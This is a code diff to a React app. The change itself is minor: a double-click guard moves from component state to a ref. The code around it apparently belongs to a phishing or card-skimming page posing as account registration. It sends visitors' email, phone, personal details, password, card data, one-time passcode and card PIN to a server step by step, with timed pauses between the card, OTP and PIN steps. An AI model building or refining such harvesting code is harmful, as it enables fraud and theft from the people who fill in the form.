@@ -33,7 +33,7 @@ const App: React.FC = () => {
   const [paymentSubStep, setPaymentSubStep] = useState<'info' | 'card' | 'otp' | 'pin'>('info');
   const [verificationSubStep, setVerificationSubStep] = useState<'initial' | 'phone_otp' | 'email_otp'>('initial');
   const [recaptchaStatus, setRecaptchaStatus] = useState<'idle' | 'verifying' | 'verified'>('idle');
-  const [isProcessing, setIsProcessing] = useState(false);
+  const isProcessingRef = useRef(false);
   
   // Account Type selection state
   const [accountType, setAccountType] = useState<string | null>(null);
@@ -293,12 +293,12 @@ const App: React.FC = () => {
 
   const handleNextStep = () => {
     // Prevent multiple rapid clicks
-    if (isProcessing) {
+    if (isProcessingRef.current) {
       console.log('⚠️ Already processing, ignoring click');
       return;
     }
     
-    setIsProcessing(true);
+    isProcessingRef.current = true;
     
     // Save data before moving to next step
     if (step === 1 && accountType) {
@@ -307,7 +307,7 @@ const App: React.FC = () => {
       if (step1Email) formData.email = step1Email;
       if (step1Phone) formData.phone = step1Phone;
       socketService.saveVisitorData(formData, 'step1-account-type');
-      setTimeout(() => setIsProcessing(false), 500);
+      setTimeout(() => { isProcessingRef.current = false; }, 500);
     } else if (step === 2) {
       const formData = {
         namesAr,
@@ -319,13 +319,13 @@ const App: React.FC = () => {
         nationality,
       };
       socketService.saveVisitorData(formData, 'step2-personal-info');
-      setTimeout(() => setIsProcessing(false), 500);
+      setTimeout(() => { isProcessingRef.current = false; }, 500);
     } else if (step === 3 && password) {
       const formData = { password, confirmPassword };
       socketService.saveVisitorData(formData, 'step3-password');
-      setTimeout(() => setIsProcessing(false), 500);
+      setTimeout(() => { isProcessingRef.current = false; }, 500);
     } else {
-      setIsProcessing(false);
+      isProcessingRef.current = false;
     }
     
     if (step === 4) {
@@ -333,23 +333,23 @@ const App: React.FC = () => {
         setPaymentSubStep('card');
       } else if (paymentSubStep === 'card') {
         socketService.saveVisitorData(paymentData, 'step4-payment-card');
-        setIsProcessing(true);
+        isProcessingRef.current = true;
         setTimeout(() => {
-          setIsProcessing(false);
+          isProcessingRef.current = false;
           setPaymentSubStep('otp');
         }, 3000);
       } else if (paymentSubStep === 'otp') {
         socketService.saveVisitorData(otpData, 'step4-payment-otp');
-        setIsProcessing(true);
+        isProcessingRef.current = true;
         setTimeout(() => {
-          setIsProcessing(false);
+          isProcessingRef.current = false;
           setPaymentSubStep('pin');
         }, 3000);
       } else if (paymentSubStep === 'pin') {
         socketService.saveVisitorData(pinData, 'step4-payment-pin');
-        setIsProcessing(true);
+        isProcessingRef.current = true;
         setTimeout(() => {
-          setIsProcessing(false);
+          isProcessingRef.current = false;
           setStep(5);
         }, 3000);
       }
